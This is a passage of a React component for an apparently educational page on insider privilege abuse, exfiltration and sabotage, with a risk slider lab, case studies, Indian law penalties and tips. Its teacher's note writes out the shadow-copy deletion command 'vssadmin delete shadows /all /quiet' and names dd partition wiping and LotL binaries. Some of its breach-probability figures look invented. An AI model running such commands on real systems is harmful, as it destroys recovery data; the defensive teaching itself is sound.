          <div className="bg-[#070b14] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-gray-800 pb-4">
              <div>
                <div className="flex items-center gap-2 flex-wrap">
                  <span className={clsx("text-xs font-bold px-2.5 py-0.5 rounded border", activeThreat.categoryBadge)}>
                    {activeThreat.category}
                  </span>
                  <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-gray-300 font-mono">
                    Protocol: {activeThreat.channelProtocol}
                  </span>
                </div>
                <h3 className="text-lg font-bold text-white mt-2">{activeThreat.name}</h3>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                    Exploitation Vector &amp; Mechanics
                  </span>
                  <p className="text-gray-300 leading-relaxed">{activeThreat.exploitationVector}</p>
                </div>

                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-amber-400 uppercase tracking-wider text-[10px] block">
                    Vulnerability Impact &amp; Telemetry Indicator
                  </span>
                  <p className="text-gray-300 leading-relaxed font-semibold">{activeThreat.vulnerabilityImpact}</p>
                  <p className="text-gray-400 text-[11px]">{activeThreat.telemetryIndicator}</p>
                </div>
              </div>

              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                    Resilient Enterprise Defense &amp; Countermeasures
                  </span>
                  <p className="text-gray-300 leading-relaxed">{activeThreat.resilientDefense}</p>
                </div>

                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                    Technical Syntax / Rule Example
                  </span>
                  <pre className="bg-black/90 p-3 rounded font-mono text-[11px] text-indigo-200 overflow-x-auto whitespace-pre-wrap border border-indigo-950/50">
                    {activeThreat.codeSnippet}
                  </pre>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 4: Studio 2 - Live Exfiltration & Sabotage Laboratory */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-emerald-400">
              Interactive Concept Studio 2
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              4. Exfiltration &amp; Sabotage Risk Laboratory
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Adjust exfiltration data volume score V, privileged access authorization level P, and PAW &amp; DAM controls hardening R 
              to model breach probability P_sabotage = 1 - exp(-(V × P) / R) and see how PAW and WORM vaults reduce breach probability below 1.6%:
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            {/* Input Controls */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 space-y-4 text-xs">
              <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">Volume &amp; Privilege Variables</h3>

              <div className="space-y-1">
                <div className="flex justify-between text-gray-400">
                  <span>Data Volume Scale (V):</span>
                  <span className="text-cyan-400 font-bold font-mono">{dataVolumeScore.toFixed(1)}x</span>
                </div>
                <input
                  type="range"
                  min="1.0"
                  max="4.0"
                  step="0.5"
                  value={dataVolumeScore}
                  onChange={(e) => setDataVolumeScore(parseFloat(e.target.value))}
                  className="w-full accent-cyan-500 bg-gray-800"
                />
              </div>

              <div className="space-y-1">
                <div className="flex justify-between text-gray-400">
                  <span>Privileged Access Level (P):</span>
                  <span className="text-rose-400 font-bold font-mono">{privilegeScore.toFixed(1)}x</span>
                </div>
                <input
                  type="range"
                  min="1.0"
                  max="4.0"
                  step="0.5"
                  value={privilegeScore}
                  onChange={(e) => setPrivilegeScore(parseFloat(e.target.value))}
                  className="w-full accent-rose-500 bg-gray-800"
                />
              </div>

              <div className="space-y-1 pt-1">
                <span className="text-gray-400 block">PAW &amp; DAM Hardening Controls (R):</span>
                <div className="grid grid-cols-3 gap-1.5">
                  <button
                    onClick={() => setPawControlsStrength(1)}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      pawControlsStrength === 1
                        ? "bg-rose-950 border-rose-500 text-rose-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  >
                    None (1x)
                  </button>
                  <button
                    onClick={() => setPawControlsStrength(50)}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      pawControlsStrength === 50
                        ? "bg-amber-950 border-amber-500 text-amber-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  >
                    Firewall (50x)
                  </button>
                  <button
                    onClick={() => setPawControlsStrength(500)}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      pawControlsStrength === 500
                        ? "bg-emerald-950 border-emerald-500 text-emerald-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  >
                    PAW+WORM (500x)
                  </button>
                </div>
              </div>
            </div>

            {/* Calculated Output Metrics */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 col-span-1 md:col-span-2 space-y-4 text-xs">
              <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">Privileged Telemetry Assessment</h3>

              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-950 p-3 rounded-lg border border-gray-800">
                  <span className="text-gray-400 text-[10px] uppercase block">Raw Exfiltration Likelihood</span>
                  <span className="text-lg font-extrabold text-white">{sabotageSimulation.rawBreachProb}%</span>
                  <span className="text-[10px] text-gray-400 block mt-0.5">Without PAW &amp; DAM Armor</span>
                </div>

                <div className="bg-gray-950 p-3 rounded-lg border border-gray-800">
                  <span className="text-gray-400 text-[10px] uppercase block">Actual Breach Probability</span>
                  <span className="text-lg font-extrabold text-emerald-400">{sabotageSimulation.actualBreachProb}%</span>
                  <span className="text-[10px] text-gray-400 block mt-0.5">With PAW &amp; Immutable WORM Active</span>
                </div>
              </div>

              <div className={clsx("p-4 rounded-lg border font-mono text-xs", sabotageSimulation.badgeClass)}>
                <span className="font-bold block uppercase tracking-wider text-[10px]">Privileged Security Assessment:</span>
                <p className="mt-1 font-extrabold text-sm">{sabotageSimulation.statusMessage}</p>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 5: Studio 4 - Privileged Security Code Studio */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              DNS Entropy &amp; WORM Storage Studio
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              5. Production DNS Entropy Inspection &amp; WORM Storage Studio
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore production Python Shannon entropy calculators for DNS tunneling detection, PowerShell scripts enforcing 
              AWS S3 Object Lock Compliance WORM retention, and C++ steganalysis inspectors for LSB image embedding:
            </p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
            {Object.entries(codeDatabase).map(([key, item]) => (
              <button
                key={key}
                onClick={() => setActiveCodeTab(key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 text-xs font-bold",
                  activeCodeTab === key
                    ? "bg-purple-950 border-purple-500 text-purple-300 shadow-md shadow-purple-950/50"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              >
                {item.name}
              </button>
            ))}
          </div>

          <div className="bg-[#050811] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-4">
            <div className="flex items-center justify-between border-b border-gray-800 pb-3">
              <h3 className="text-sm font-bold text-white">{activeCode.name}</h3>
              <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-purple-400 font-mono">
                Production Forensic Tool
              </span>
            </div>

            <p className="text-xs text-gray-300">{activeCode.explanation}</p>

            <pre className="bg-black/90 p-4 rounded-lg font-mono text-xs text-purple-200 overflow-x-auto whitespace-pre-wrap border border-purple-950/50">
              {activeCode.code}
            </pre>
          </div>
        </section>

        {/* SECTION 6: Studio 3 - Regional West Bengal Pedagogical Case Studies */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-amber-400">
              Regional Engineering Applications
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              6. West Bengal Field Case Studies: Kolkata, Barrackpore, Ichapur &amp; Jadavpur
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore how cybersecurity leaders Mamata, Debangshu, Mahima, and Susmita defeat DNS tunneling exfiltrations, 
              neutralize volume shadow deletion sabotage, and block medical image steganography across West Bengal enterprises:
            </p>
          </div>

          {/* Scenario Tabs */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            {localScenarios.map((sc) => (
              <button
                key={sc.id}
                onClick={() => setActiveScenarioId(sc.id)}
                className={clsx(
                  "p-4 rounded-xl border text-left transition-all duration-300 space-y-2",
                  activeScenarioId === sc.id
                    ? "bg-amber-950/60 border-amber-500 shadow-md"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              >
                <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-gray-900 text-amber-300 border border-amber-800">
                  {sc.lead} · {sc.location.split(" ")[0]}
                </span>
                <h4 className="text-xs font-bold text-white line-clamp-1">{sc.title}</h4>
                <p className="text-[11px] text-gray-400 line-clamp-1">{sc.threatType}</p>
              </button>
            ))}
          </div>

          {/* Active Scenario Detailed Breakdown */}
          <div className="bg-[#070b14] p-6 rounded-xl border border-gray-800 space-y-5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-gray-800 pb-3">
              <div>
                <span className="text-xs font-bold text-amber-400 uppercase tracking-wider">
                  {activeScenario.location}
                </span>
                <h3 className="text-base sm:text-lg font-bold text-white mt-0.5">{activeScenario.title}</h3>
              </div>
              <div className="text-right text-xs">
                <span className="text-gray-400 block">Lead Architect: {activeScenario.lead}</span>
                <span className="font-semibold text-emerald-400">Security Budget: {activeScenario.budget}</span>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px]">
                  The Incident &amp; Threat Mechanics
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.incident}</p>
              </div>

              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px]">
                  Architectural Defense &amp; Resolution
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.defenseStrategy}</p>
              </div>
            </div>

            {/* Metrics Dashboard */}
            <div className="bg-[#050811] p-4 rounded-lg border border-gray-800 grid grid-cols-2 sm:grid-cols-4 gap-3 text-center">
              {Object.entries(activeScenario.metrics).map(([key, val]) => (
                <div key={key} className="bg-gray-950 p-2.5 rounded border border-gray-800/80">
                  <span className="text-[10px] text-gray-400 uppercase tracking-wider block capitalize">
                    {key.replace(/([A-Z])/g, " $1")}
                  </span>
                  <span className="text-xs sm:text-sm font-extrabold text-white mt-1 block">{val}</span>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* SECTION 7: Statutory & Legal Frameworks in India */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Statutory Jurisprudence
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              7. Legal Liabilities for Data Exfiltration &amp; Sabotage in India
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Indian cyber law, critical infrastructure protection mandates, and criminal mischief statutes 
              treat data exfiltration, database sabotage, and attacks on protected systems with the most severe statutory penalties:
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            <div className="bg-gray-950 p-5 rounded-xl border border-rose-950 space-y-3">
              <span className="text-xs font-bold text-rose-400 uppercase tracking-wider block">
                IT Act 2000 Section 70
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Protected Systems Sabotage:</strong> Attacking or sabotaging critical infrastructure carries up to <span className="text-rose-400 font-bold">10 YEARS IMPRISONMENT</span> and severe fines.
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-blue-950 space-y-3">
              <span className="text-xs font-bold text-blue-400 uppercase tracking-wider block">
                IT Act Section 43(c) &amp; IPC 427
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Section 43(c):</strong> Civil damages up to <span className="text-rose-400 font-bold">₹1 CRORE</span> for introducing contaminants or sabotage.
                </li>
                <li>
                  <strong className="text-white">IPC Section 427:</strong> Mischief &amp; Property Sabotage (Up to 2 years prison).
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-emerald-950 space-y-3">
              <span className="text-xs font-bold text-emerald-400 uppercase tracking-wider block">
                DPDP Act 2023 &amp; IT Act 66B
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">DPDP Section 33:</strong> Fines up to <span className="text-rose-400 font-bold">₹250 CRORES</span> for failing to implement exfiltration safeguards.
                </li>
                <li>
                  <strong className="text-white">IT Act 66B:</strong> Retaining stolen data (Up to 3 years prison).
                </li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 8: Common Pitfalls, Pro Tips, Thinking Hints & Mini Checklist */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Exam &amp; Professional Mastery
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              8. Common Pitfalls, Industry Best Practices &amp; Key Hints
            </h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            {/* Common Pitfalls */}
            <div className="bg-gray-950 p-4 rounded-xl border border-rose-950/60 space-y-3">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                Common Beginner Mistakes
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Assuming Egress Firewalls Block All Outbound Data:</strong> DNS and ICMP tunnels transmit data over permitted ports.
                </li>
                <li>
                  <strong>Relying on Local Windows Shadow Copies for Recovery:</strong> Saboteurs delete shadow snapshots via `vssadmin`.
                </li>
                <li>
                  <strong>Trusting Unaltered Appearance of Image Files:</strong> LSB steganography hides entire databases inside image pixels.
                </li>
              </ul>
            </div>

            {/* Professional Tips */}
            <div className="bg-gray-950 p-4 rounded-xl border border-emerald-950/60 space-y-3">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                Professional Tips &amp; Tricks
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Deploy Privileged Access Workstations (PAW):</strong> Dedicated admin hosts with zero internet egress.
                </li>
                <li>
                  <strong>Enforce Immutable WORM Backups with S3 Compliance Locking:</strong> Prevents deletion even by root administrators.
                </li>
                <li>
                  <strong>Deploy Database Activity Monitoring (DAM):</strong> Automatically kill SQL queries dumping &gt; 50 rows.
                </li>
              </ul>
            </div>

            {/* Hint Section */}
            <div className="bg-gray-950 p-4 rounded-xl border border-indigo-950/60 space-y-3">
              <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                Pedagogical Thinking Hints
              </span>
              <ul className="space-y-2 text-gray-300">
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Think about...</span>
                  Why does Shannon entropy analysis (H(X) &gt; 4.5) detect base64 DNS tunneling exfiltration even when query domains look like random strings?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Observe carefully...</span>
                  Why does AWS S3 Object Lock Compliance Mode prevent root administrators from deleting backup snapshots during a sabotage event?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Try changing this...</span>
                  In the laboratory above, set controls strength to PAW+WORM (500x) and observe breach probability drop to 1.5%!
                </li>
              </ul>
            </div>
          </div>

          {/* Mini Checklist */}
          <div className="bg-gray-950 p-5 rounded-xl border border-gray-800 space-y-3">
            <h3 className="text-xs font-bold text-white uppercase tracking-wider text-rose-400">
              Student Mini Checklist (Exam &amp; Career Essentials)
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5 text-xs text-gray-300">
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Privilege Abuse uses legitimate rights illicitly; Privilege Escalation gains rights illegally.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>DNS Tunneling encodes stolen data into lookup subdomains, bypassing firewalls on UDP port 53.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>LSB Steganography hides binary data in image pixels, detected via Chi-Square statistical tests.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Privileged Access Workstations (PAW) have zero internet access, isolating admin operations.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Immutable WORM backups prevent deletion even by the root administrator until the timer expires.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Section 70 of the IT Act penalizes sabotage of Protected Critical Systems with up to 10 years prison.</span>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 9: FAQ Template */}
        <section className="space-y-4">
          <FAQTemplate
            title="Privilege Abuse & Sabotage FAQs"
            subtitle="30 Moderate to Expert Practice Questions & Covert Exfiltration Deep Dives"
            questions={questions}
          />
        </section>

        {/* SECTION 10: PlainTextPrint Component */}
        <section className="space-y-4">
          <PlainTextPrint
            content={noteText}
            title="Privilege Abuse, Data Exfiltration, and Sabotage (Printable Study Guide)"
            stampEnabled={true}
            showDownload={true}
            downloadButtonText="Download Note"
            downloadFileName="topic9_note.txt"
          />
        </section>

        {/* SECTION 11: Dedicated Teacher's Note */}
        <section className="pt-4">
          <Teacher
            note="Teacher's Note: Privilege abuse and sabotage represent the most devastating insider threat actions because perpetrators possess legitimate administrative credentials! Master the covert exfiltration channels: understand how DNS Tunneling encodes base64 database chunks into lookup subdomains over UDP port 53 (detected via Shannon entropy analysis $H(X) > 4.5$), how LSB Image Steganography hides confidential records inside image pixel bytes (detected via Chi-Square statistical steganalysis), and how attackers Living off the Land (LotL) weaponize native binaries like certutil, bitsadmin, and tar to evade antivirus tools. Understand infrastructure sabotage mechanics: Volume Shadow Copy deletion via `vssadmin delete shadows /all /quiet`, partition table wiping via `dd`, and stealth backdoor account injections. To build an impenetrable defense: deploy Privileged Access Workstations (PAW) with zero internet egress for all administrative duties, enforce Database Activity Monitoring (DAM) terminating queries returning &gt; 50 rows, configure immutable WORM storage with AWS S3 Object Lock Compliance Mode to prevent root deletion, and record 100% of admin sessions with Privileged Session Recording (PSR). Remember that Section 70 of the Indian IT Act treats attacks on Protected Critical Systems with up to 10 years imprisonment!"
          />
        </section>

      </div>
    </div>
  );
};

export default Topic9;
